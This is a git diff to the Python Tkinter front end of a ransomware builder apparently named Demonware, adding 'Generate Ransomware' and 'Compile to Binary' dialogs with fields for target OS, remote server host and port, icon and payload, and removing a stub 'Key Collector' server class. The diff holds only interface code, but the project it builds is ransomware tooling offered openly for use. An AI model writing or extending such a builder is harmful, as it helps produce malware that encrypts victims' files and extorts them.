@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64
+import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64, platform
 from tkinter import *
 from tkinter.ttk import *
 from ttkthemes import ThemedStyle
@@ -45,6 +45,8 @@ class MainWindow(Tk):
             'local' : StringVar(),
             'platform' : StringVar(),
             'key' : StringVar(),
+            'os' : StringVar(),
+            'mode' : StringVar(),
         }
 
         self.options['host'].set('0.0.0.0')
@@ -68,8 +70,8 @@ class MainWindow(Tk):
 
         # Buttons
         start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
-        generate_demon = Button(self, text = "GENERATE RANSOMWARE", command = self.exit, width = 53).grid(row = 5, column = 0, columnspan = 6)
-        compile = Button(self, text = "COMPILE TO BINARY", command = self.exit, width = 53).grid(row = 6, column = 0, columnspan = 6)
+        generate_demon = Button(self, text = "GENERATE RANSOMWARE", command = self.generate, width = 53).grid(row = 5, column = 0, columnspan = 6)
+        compile = Button(self, text = "COMPILE TO BINARY", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
         decrypt = Button(self, text = "DECRYPT FILES", command = self.exit, width = 53).grid(row = 7, column = 0, columnspan = 6)
         exit = Button(self, text = "EXIT", command = self.exit, width = 53).grid(row = 8, column = 0, columnspan = 6)
 
@@ -137,7 +139,6 @@ class MainWindow(Tk):
         label2.image = photo # keep a reference!
         label2.grid(row = 0, column = 3)
 
-
         # Log Frame
         result = LabelFrame(self.serv, text = 'Log', relief = GROOVE)
         result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
@@ -157,9 +158,75 @@ class MainWindow(Tk):
 
         self.start_thread()
 
-    def start_thread(self):
-        #self.enter_data.destroy()
+    def compile(self):
+        self.comp = Toplevel()
+        self.comp.title(string = 'Compile')
+        self.comp.configure(background = 'white')
+        self.comp.resizable(0,0)
 
+        self.comp.bind("<Escape>", self.close_compile) # Press ESC to close window
+
+        ico_path = None
+        payload_path = None
+
+        msg = LabelFrame(self.comp, text = 'Message', relief = GROOVE)
+        msg.grid(row = 0, column = 0, columnspan = 3)
+        Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on' % platform.system(), background = 'white', font='Helvetica 16').grid(row = 0, column = 0)
+
+        os_frame = LabelFrame(self.comp, text = 'Select OS')
+        os_frame.grid(row = 1, column = 0)
+        windows = Radiobutton(os_frame, text = 'Windows', variable = self.options['os'], value = 'windows').grid(row = 0, column = 0, sticky = 'w')
+        mac = Radiobutton(os_frame, text = 'MacOS', variable = self.options['os'], value = 'mac').grid(row = 1, column = 0, sticky = 'w')
+        linux = Radiobutton(os_frame, text = 'Linux', variable = self.options['os'], value = 'linux').grid(row = 2, column = 0, sticky = 'w')
+
+        sett_frame = LabelFrame(self.comp, text = 'Options')
+        sett_frame.grid(row = 1, column = 1, columnspan = 2)
+        ico_path = Entry(sett_frame, textvariable = ico_path, width = 20)
+        ico_path.grid(row = 0, column = 0)
+        set_ico = Button(sett_frame, text = "SELECT ICON", command = self.comp.destroy, width = 15).grid(row = 0, column = 1)
+
+        payload_path = Entry(sett_frame, textvariable = payload_path, width = 20)
+        payload_path.grid(row = 1, column = 0)
+        set_payload = Button(sett_frame, text = "SELECT PAYLOAD", command = self.comp.destroy, width = 15).grid(row = 1, column = 1)
+
+        opt_frame = LabelFrame(self.comp, text = 'Finishing')
+        opt_frame.grid(row = 2, column = 0, columnspan = 2)
+        finish = Button(opt_frame, text = "FINISH", command = self.comp.destroy, width = 45).grid(row = 0, column = 0)
+
+
+    def generate(self):
+        self.gen = Toplevel()
+        self.gen.title(string = 'Generate Payload')
+        self.gen.configure(background = 'white')
+        self.gen.resizable(0,0)
+
+        self.gen.bind("<Escape>", self.close_generate) # Press ESC to close window
+
+        host = '0.0.0.0'
+        port = 8989
+
+        mode_frame = LabelFrame(self.gen, text = 'Mode')
+        mode_frame.grid(row = 0, column = 0)
+        term = Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 'term').grid(row = 0, column = 0, sticky = 'w')
+        gui = Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 'gui').grid(row = 1, column = 0, sticky = 'w')
+
+        server_frame = LabelFrame(self.gen, text = 'Remote Server')
+        server_frame.grid(row = 0, column = 1)
+        Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
+        host = Entry(server_frame, textvariable = host, width = 20)
+        host.grid(row = 0, column = 1)
+
+        Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
+        port = Entry(server_frame, textvariable = port, width = 20)
+        port.grid(row = 1, column = 1)
+
+        finish_frame = LabelFrame(self.gen, text = 'Finish')
+        finish_frame.grid(row = 1, column = 0, columnspan = 2)
+        generate = Button(finish_frame, text = "GENERATE", command = self.gen.destroy, width = 20).grid(row = 0, column = 0)
+
+
+
+    def start_thread(self):
         # Start server as thread
         thread = threading.Thread(target=self.start_server)
         thread.daemon = True
@@ -252,6 +319,12 @@ class MainWindow(Tk):
     def close_server(self, event):
         self.serv.destroy()
 
+    def close_compile(self, event):
+        self.comp.destroy()
+
+    def close_generate(self, event):
+        self.gen.destroy()
+
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/demon')
 
@@ -263,20 +336,6 @@ class MainWindow(Tk):
 
     def view_license(self):
         messagebox.showinfo('License', 'Currect license is: Free (Public Test)')
-
-class Server(Tk):
-    def __init__(self, host, port):
-        Tk.__init__(self)
-        self.title(string = "Demonware Server - Key Collector") # Set window title
-        self.resizable(0,0) # Do not allow to be resized
-        self.ttkStyle = ThemedStyle()
-        self.ttkStyle.set_theme("arc")
-        self.configure(background = 'white')
-        #icon = PhotoImage(file='icon.png') # Set app icon
-        #self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon
-
-
-
 
 main = MainWindow()
 main.mainloop()
